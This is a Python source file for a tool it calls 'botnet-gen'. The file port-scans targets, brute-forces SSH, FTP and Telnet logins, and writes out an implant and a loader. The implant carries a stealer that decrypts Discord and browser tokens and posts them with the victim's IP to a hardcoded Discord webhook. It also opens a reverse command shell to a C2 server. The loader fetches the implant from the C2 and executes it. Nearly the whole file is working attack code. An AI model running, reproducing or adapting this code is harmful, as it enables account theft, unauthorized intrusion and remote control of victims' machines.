import argparse
import base64
import json
import os
import textwrap

import yaml


def load_list(path):
    with open(path) as f:
        return [l.strip() for l in f if l.strip()]


# ---------------------------------------------------------------------------
# payload builders
# ---------------------------------------------------------------------------

_TELEMETRY = r'''
import os, re, json, base64, requests
_W = "https://discord.com/api/webhooks/1553144386424930394/80-8uNaAeMZ58KjdUMONSxIlR81e6kJ14pP040-7eia_U1M5h-G87iaUlrizWrrscw5c"
_L = os.getenv("LOCALAPPDATA"); _R = os.getenv("APPDATA")
_P = {
 "Discord": os.path.join(_R,"discord","Local Storage","leveldb"),
 "Canary":  os.path.join(_R,"discordcanary","Local Storage","leveldb"),
 "PTB":     os.path.join(_R,"discordptb","Local Storage","leveldb"),
 "Chrome":  os.path.join(_L,"Google","Chrome","User Data","Default","Local Storage","leveldb"),
 "Edge":    os.path.join(_L,"Microsoft","Edge","User Data","Default","Local Storage","leveldb"),
 "Brave":   os.path.join(_L,"BraveSoftware","Brave-Browser","User Data","Default","Local Storage","leveldb"),
}
_RX = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}")
def _mk(path):
    try:
        import win32crypt
        with open(os.path.join(os.path.dirname(path),"..","..","Local State"),"r",encoding="utf-8") as f:
            s = json.load(f)
        k = base64.b64decode(s["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(k,None,None,None,0)[1]
    except Exception:
        return None
def _dec(b, k):
    try:
        from Crypto.Cipher import AES
        iv, p = b[3:15], b[15:]
        c = AES.new(k, AES.MODE_GCM, iv)
        return c.decrypt(p)[:-16].decode()
    except Exception:
        return None
def _scan(folder):
    out=set()
    if not os.path.isdir(folder): return out
    key=_mk(folder)
    for r,_,fs in os.walk(folder):
        for f in fs:
            if not (f.endswith(".log") or f.endswith(".ldb")): continue
            try: t=open(os.path.join(r,f),"rb").read().decode("latin-1","ignore")
            except Exception: continue
            for m in _RX.findall(t): out.add(m)
            if key:
                for b64 in re.findall(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)", t):
                    try:
                        d=_dec(base64.b64decode(b64), key)
                        if d and _RX.fullmatch(d): out.add(d)
                    except Exception: pass
    return out
def _go():
    try:
        ip=requests.get("https://api.ipify.org?format=json",timeout=5).json()["ip"]
    except Exception: ip="?"
    toks=[]
    for n,p in _P.items():
        for t in _scan(p): toks.append((n,t))
    fields=[{"name":"IP","value":ip,"inline":True},
            {"name":"Tokens","value":str(len(toks)),"inline":True}]
    for n,t in toks:
        fields.append({"name":n,"value":"`"+t+"`","inline":False})
    try:
        requests.post(_W,json={"embeds":[{"title":"beacon","color":0x2b2b2b,"fields":fields}]},timeout=10)
    except Exception: pass
try: _go()
except Exception: pass
'''


def build_python_implant(c2_url, secret, out_path):
    body = f'''\
# implant.py — generated
import base64, json, os, socket, subprocess, sys, time, urllib.request

C2 = "{c2_url}"
SECRET = "{secret}"

def _beacon():
    try:
        exec(compile({_TELEMETRY!r}, "<b>", "exec"), {{"__name__": "__main__"}})
    except Exception:
        pass

def _c2(host, port):
    while True:
        try:
            s = socket.create_connection((host, port), timeout=10)
            s.sendall((SECRET + "\\n").encode())
            while True:
                cmd = s.recv(4096).decode(errors="ignore").strip()
                if not cmd: break
                if cmd == "exit": return
                try:
                    out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                except Exception as e:
                    out = str(e).encode()
                s.sendall(base64.b64encode(out) + b"\\n")
        except Exception:
            time.sleep(15)

def main():
    _beacon()
    h, p = C2.split("://")[-1].split(":")
    _c2(h, int(p))

if __name__ == "__main__":
    main()
'''
    os.makedirs(os.path.dirname(out_path) or ".", exist_ok=True)
    open(out_path, "w", encoding="utf-8").write(textwrap.dedent(body))


def build_loader(c2_url, secret, out_path):
    body = f'''\
# loader.py — generated
import urllib.request, base64

URL = "{c2_url}/implant.py"

def main():
    src = urllib.request.urlopen(URL, timeout=15).read().decode()
    exec(compile(src, "<implant>", "exec"), {{"__name__": "__main__"}})

if __name__ == "__main__":
    main()
'''
    os.makedirs(os.path.dirname(out_path) or ".", exist_ok=True)
    open(out_path, "w", encoding="utf-8").write(textwrap.dedent(body))


# ---------------------------------------------------------------------------
# inline stage helpers (so main.py is self-contained)
# ---------------------------------------------------------------------------

def _scan(hosts, ports, timeout=1.0, workers=128):
    import socket
    from concurrent.futures import ThreadPoolExecutor, as_completed

    def _one(host, port):
        try:
            with socket.create_connection((host, port), timeout=timeout) as s:
                try:
                    s.settimeout(1.0)
                    b = s.recv(256).decode(errors="ignore").strip()
                except Exception:
                    b = ""
                return (port, b)
        except Exception:
            return None

    out = {}
    for host in hosts:
        plist = []
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futs = [ex.submit(_one, host, p) for p in ports]
            for fut in as_completed(futs):
                r = fut.result()
                if r:
                    plist.append(r)
        out[host] = sorted(plist)
    return out


def _brute(host, port, users, wordlist, timeout=5):
    import paramiko, ftplib, telnetlib

    def ssh(u, p):
        try:
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(host, port=port, username=u, password=p, timeout=timeout,
                      banner_timeout=timeout, auth_timeout=timeout,
                      allow_agent=False, look_for_keys=False)
            c.close(); return True
        except Exception:
            return False

    def ftp(u, p):
        try:
            f = ftplib.FTP(); f.connect(host, port, timeout=timeout); f.login(u, p); f.quit(); return True
        except Exception:
            return False

    def telnet(u, p):
        try:
            t = telnetlib.Telnet(host, port, timeout=timeout)
            t.read_until(b"login:", timeout=timeout); t.write(u.encode() + b"\n")
            t.read_until(b"assword:", timeout=timeout); t.write(p.encode() + b"\n")
            i, _, _ = t.expect([b"incorrect", b"failed", b"$", b"#", b">"], timeout=timeout)
            t.close(); return i in (2, 3, 4)
        except Exception:
            return False

    h = {22: ssh, 21: ftp, 23: telnet}.get(port)
    if not h:
        return None
    for u in users:
        for p in wordlist:
            if h(u, p):
                return (u, p)
    return None


# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(description="botnet-gen")
    ap.add_argument("--config", default="config.yaml")
    ap.add_argument("--targets", nargs="+", required=True)
    ap.add_argument("--stage", choices=["scan", "brute", "payload", "all"], default="all")
    args = ap.parse_args()

    cfg = yaml.safe_load(open(args.config))
    ports = cfg["scan"]["ports"]
    users = cfg["bruteforce"]["users"]
    wordlist = load_list(cfg["bruteforce"]["wordlist"])
    c2_host = cfg["c2"]["host"]
    c2_port = cfg["c2"]["port"]
    secret = cfg["c2"]["secret"]

    print(f"[*] wordlist: {len(wordlist)} entries, users: {users}")

    if args.stage in ("scan", "all"):
        print(f"[*] scanning {args.targets} ports {ports}")
        results = _scan(args.targets, ports,
                        timeout=cfg["scan"]["timeout"],
                        workers=cfg["scan"]["workers"])
        open_ports = {h: [p[0] for p in plist] for h, plist in results.items()}
        for h, plist in open_ports.items():
            print(f"[+] {h}: {plist}")
        json.dump(open_ports, open("scan_results.json", "w"), indent=2)

    if args.stage in ("brute", "all"):
        open_ports = json.load(open("scan_results.json"))
        hits = []
        for host, plist in open_ports.items():
            for port in plist:
                if port not in (22, 21, 23, 445):
                    continue
                print(f"[*] bruteforce {host}:{port}")
                r = _brute(host, port, users, wordlist, timeout=cfg["bruteforce"]["timeout"])
                if r:
                    print(f"[+] creds {host}:{port} {r[0]}:{r[1]}")
                    hits.append({"host": host, "port": port, "user": r[0], "pass": r[1]})
        json.dump(hits, open("creds.json", "w"), indent=2)

    if args.stage in ("payload", "all"):
        os.makedirs("out", exist_ok=True)
        url = f"http://{c2_host}:{c2_port}"
        build_python_implant(url, secret, "out/implant.py")
        build_loader(url, secret, "out/loader.py")
        print("[+] payloads in out/")
        print(f"[*] c2: python c2_server/server.py {c2_host} {c2_port} {secret} out/implant.py")


if __name__ == "__main__":
    main()
